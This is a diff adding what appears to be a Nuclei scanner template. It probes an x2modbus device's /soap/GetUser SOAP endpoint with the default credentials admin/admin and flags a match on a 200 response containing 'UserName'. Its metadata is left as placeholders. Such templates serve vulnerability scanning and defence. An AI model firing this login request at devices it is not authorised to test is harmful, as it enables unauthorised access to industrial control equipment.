@@ -1,0 +1,41 @@
+
+id: x2modbus-GetUser-weak
+
+info:
+  name: Template Name
+  author: Administrator
+  severity: high
+  description: description
+  reference:
+    - https://
+  tags: tags
+
+http:
+  - raw:
+      - |
+        POST /soap/GetUser HTTP/1.1
+        Host: {{Hostname}}
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Referer: http://{{Hostname}}/login.html
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: language=zh-cn; username=admin1
+        If-Modified-Since: Sat Jun 29 10:02:08 2019
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 58
+
+        <GetUser><User Name="admin" Password="admin"/></GetUser>
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - UserName
+      - type: status
+        status:
+          - 200
